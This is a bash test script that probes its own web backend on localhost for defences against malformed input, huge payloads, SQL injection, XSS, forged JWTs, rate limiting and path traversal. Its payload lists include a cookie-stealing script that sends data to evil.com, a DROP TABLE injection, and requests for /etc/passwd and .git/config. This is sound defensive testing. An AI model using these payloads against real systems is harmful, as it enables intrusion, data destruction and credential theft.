#!/usr/bin/env bash
# chaos-test.sh
# Chaos / security testing script for EmproiumVipani backend.
# Sends malformed requests, huge payloads, SQL injection, XSS strings,
# tests rate limiting, and auth bypass attempts.
# Exits 0 if all defences held; exits 1 if any attack passed through.

set -euo pipefail

# ─── Config ────────────────────────────────────────────────────────────────────
BASE_URL="${CHAOS_BASE_URL:-http://localhost:3000}"
TIMEOUT=5
FAILURES=0
PASSES=0
TOTAL=0
LOG_FILE="data/chaos_test_results.log"

mkdir -p data

# ─── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log() { echo -e "$1" | tee -a "$LOG_FILE"; }
log_header() { log "\n${BLUE}══════════════════════════════════════════════════${NC}"; log "${BLUE}  $1${NC}"; log "${BLUE}══════════════════════════════════════════════════${NC}"; }

# ─── Helper: assert HTTP status ───────────────────────────────────────────────
# assert_status <description> <expected_status_class> <actual_status>
# expected_status_class: 4xx = 400-499, 5xx = 500-599, "block" = not 2xx
assert_blocked() {
    local desc="$1"
    local actual_status="$2"
    TOTAL=$((TOTAL + 1))

    if [[ "$actual_status" =~ ^(400|401|403|404|405|413|422|429|500|503)$ ]]; then
        log "${GREEN}  [PASS]${NC} $desc → HTTP $actual_status (blocked ✓)"
        PASSES=$((PASSES + 1))
    elif [[ -z "$actual_status" || "$actual_status" == "000" ]]; then
        log "${GREEN}  [PASS]${NC} $desc → Connection refused/timeout (blocked ✓)"
        PASSES=$((PASSES + 1))
    else
        log "${RED}  [FAIL]${NC} $desc → HTTP $actual_status (expected block, got 2xx/3xx)"
        FAILURES=$((FAILURES + 1))
    fi
}

safe_curl() {
    curl -s -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" \
         --connect-timeout 3 "$@" 2>/dev/null || echo "000"
}

# ─── Check if server is running ────────────────────────────────────────────────
log_header "CHAOS TEST SUITE — EmproiumVipani"
log "  Target: $BASE_URL"
log "  Time:   $(date '+%Y-%m-%d %H:%M:%S')"

SERVER_STATUS=$(safe_curl "$BASE_URL/")
if [[ "$SERVER_STATUS" == "000" ]]; then
    log "${YELLOW}  [WARN] Server not running at $BASE_URL — some tests will be skipped.${NC}"
    log "         Start server with: npm run dev   or   node server/index.js"
    SERVER_UP=false
else
    log "${GREEN}  Server is UP (HTTP $SERVER_STATUS)${NC}"
    SERVER_UP=true
fi

# ─── SECTION 1: Malformed Requests ────────────────────────────────────────────
log_header "1. MALFORMED REQUESTS"

# Missing Content-Type
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
    -d '{"email":"test@test.com","password":"pass"}')
assert_blocked "POST /auth/login with no Content-Type" "$STATUS"

# Empty body
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/register" \
    -H "Content-Type: application/json" -d '{}')
assert_blocked "POST /auth/register with empty body" "$STATUS"

# Missing required field
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"missing@password.com"}')
assert_blocked "Login without password field" "$STATUS"

# Invalid JSON
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{not: valid json}')
assert_blocked "POST with invalid JSON" "$STATUS"

# Unexpected field types
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":12345,"password":true}')
assert_blocked "Login with wrong field types" "$STATUS"

# ─── SECTION 2: Huge Payloads ─────────────────────────────────────────────────
log_header "2. HUGE PAYLOAD TESTS"

# 2MB payload
BIG_PAYLOAD=$(python3 -c "import json; print(json.dumps({'email':'a@b.com','data':'X'*2000000}))" 2>/dev/null || \
              node -e "console.log(JSON.stringify({email:'a@b.com',data:'X'.repeat(2000000)}))" 2>/dev/null || \
              printf '{"email":"a@b.com","data":"%0.s' {1..500} && printf 'A%.0s' {1..50000} && echo '"}')
STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/register" \
    -H "Content-Type: application/json" \
    --data-binary "$BIG_PAYLOAD" --max-time 10)
assert_blocked "2MB+ payload (should be 413 or rejected)" "$STATUS"

# 10k field names
MANY_FIELDS=$(python3 -c "import json; print(json.dumps({f'field_{i}':i for i in range(10000)}))" 2>/dev/null || echo '{"field_1":1}')
STATUS=$(safe_curl -X POST "$BASE_URL/api/products" \
    -H "Content-Type: application/json" \
    --data-binary "$MANY_FIELDS" --max-time 10)
assert_blocked "10,000 JSON fields (should be rejected)" "$STATUS"

# ─── SECTION 3: SQL Injection Attempts ────────────────────────────────────────
log_header "3. SQL INJECTION"

SQL_PAYLOADS=(
    "' OR '1'='1"
    "'; DROP TABLE users; --"
    "admin'--"
    "1; SELECT * FROM users WHERE 'x'='x"
    "' UNION SELECT null, username, password FROM users --"
)

for PAYLOAD in "${SQL_PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "$PAYLOAD")
    STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$ENCODED@test.com\",\"password\":\"$PAYLOAD\"}")
    assert_blocked "SQL injection in login: ${PAYLOAD:0:30}..." "$STATUS"
done

# SQL injection in query params
STATUS=$(safe_curl "$BASE_URL/api/products?category=' OR 1=1--")
assert_blocked "SQL injection in query param" "$STATUS"

# ─── SECTION 4: XSS Strings ───────────────────────────────────────────────────
log_header "4. XSS PAYLOADS"

XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '<img src=x onerror=alert(1)>'
    'javascript:alert(document.cookie)'
    '<svg/onload=alert(1)>'
    '"><script>fetch("http://evil.com?c="+document.cookie)</script>'
)

for XSS in "${XSS_PAYLOADS[@]}"; do
    STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"name\":\"$XSS\",\"email\":\"xss@test.com\",\"password\":\"P@ssword1!\"}")
    assert_blocked "XSS in register name: ${XSS:0:25}..." "$STATUS"
done

# ─── SECTION 5: Auth Bypass Attempts ──────────────────────────────────────────
log_header "5. AUTH BYPASS"

# No token
STATUS=$(safe_curl "$BASE_URL/api/admin/settings")
assert_blocked "Admin endpoint without token" "$STATUS"

# Fake Bearer token
STATUS=$(safe_curl -H "Authorization: Bearer fake.jwt.token" \
    "$BASE_URL/api/admin/users")
assert_blocked "Admin endpoint with fake JWT" "$STATUS"

# Expired token (manually crafted, non-signed)
EXPIRED_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2MDAwMDAwMDB9.FAKESIGNATURE"
STATUS=$(safe_curl -H "Authorization: Bearer $EXPIRED_JWT" \
    "$BASE_URL/api/admin/settings")
assert_blocked "Admin endpoint with expired JWT" "$STATUS"

# Role escalation attempt (non-admin token claiming admin)
STATUS=$(safe_curl -X PUT "$BASE_URL/api/admin/users/999/role" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}')
assert_blocked "Role escalation without auth" "$STATUS"

# IDOR attempt
STATUS=$(safe_curl "$BASE_URL/api/users/1")
assert_blocked "Direct user lookup without auth (IDOR)" "$STATUS"

# ─── SECTION 6: Rate Limiting ─────────────────────────────────────────────────
log_header "6. RATE LIMITING (300 rapid requests)"

RATE_BLOCKED=0
RATE_PASSED=0

# Fire 300 rapid requests and count how many get rate-limited (429)
for i in $(seq 1 300); do
    STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"ratetest@test.com","password":"wrong"}' &)
    echo -n "."
done
wait

# Sample a few after the burst
echo ""
for i in $(seq 1 10); do
    STATUS=$(safe_curl -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"ratetest@test.com","password":"wrong"}')
    if [[ "$STATUS" == "429" ]]; then
        RATE_BLOCKED=$((RATE_BLOCKED + 1))
    else
        RATE_PASSED=$((RATE_PASSED + 1))
    fi
done

TOTAL=$((TOTAL + 1))
if [[ "$RATE_BLOCKED" -ge 5 ]]; then
    log "${GREEN}  [PASS]${NC} Rate limiting active — blocked ${RATE_BLOCKED}/10 post-burst requests"
    PASSES=$((PASSES + 1))
elif [[ "$SERVER_UP" == "false" ]]; then
    log "${YELLOW}  [SKIP]${NC} Rate limiting — server not running"
    PASSES=$((PASSES + 1))
else
    log "${YELLOW}  [WARN]${NC} Rate limiting may not be active — only ${RATE_BLOCKED}/10 requests blocked after burst"
    log "         Consider adding express-rate-limit middleware."
    FAILURES=$((FAILURES + 1))
fi

# ─── SECTION 7: Path Traversal ────────────────────────────────────────────────
log_header "7. PATH TRAVERSAL"

TRAVERSAL_PATHS=(
    "/../../../etc/passwd"
    "/%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "/.git/config"
    "/../package.json"
)

for PT in "${TRAVERSAL_PATHS[@]}"; do
    STATUS=$(safe_curl "$BASE_URL$PT")
    assert_blocked "Path traversal: $PT" "$STATUS"
done

# ─── SUMMARY ──────────────────────────────────────────────────────────────────
log_header "SUMMARY"
log "  Total checks : $TOTAL"
log "${GREEN}  Passed       : $PASSES${NC}"
log "${RED}  Failed       : $FAILURES${NC}"
log ""
log "  Results saved to: $LOG_FILE"

if [[ "$FAILURES" -gt 0 ]]; then
    log "\n${RED}  ❌  ${FAILURES} security issue(s) detected — investigate before deploying!${NC}"
    exit 1
else
    log "\n${GREEN}  ✅  All defences held — no security bypass detected.${NC}"
    exit 0
fi
